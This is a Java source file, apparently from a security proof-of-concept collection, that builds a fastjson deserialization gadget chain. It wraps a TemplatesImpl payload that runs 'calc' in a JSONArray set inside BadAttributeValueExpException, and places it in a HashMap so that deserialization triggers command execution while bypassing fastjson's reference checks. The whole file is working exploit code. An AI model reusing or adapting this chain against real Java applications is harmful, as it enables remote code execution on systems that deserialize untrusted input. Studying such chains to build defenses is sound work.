package com.javasec.pocs.fastjson;

import com.alibaba.fastjson.JSONArray;
import com.javasec.utils.SerializeUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.util.HashMap;

public class BATemplatesRefBypassChain {
    public static void main(String[] args) throws Exception {
        Templates templates = SerializeUtils.getTemplate("calc");
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        SerializeUtils.setFieldValue(badAttributeValueExpException,"val",jsonArray);
        HashMap<Object, Object> map = new HashMap<>();
        map.put(templates,badAttributeValueExpException);
        SerializeUtils.deserTester(map);
    }
}
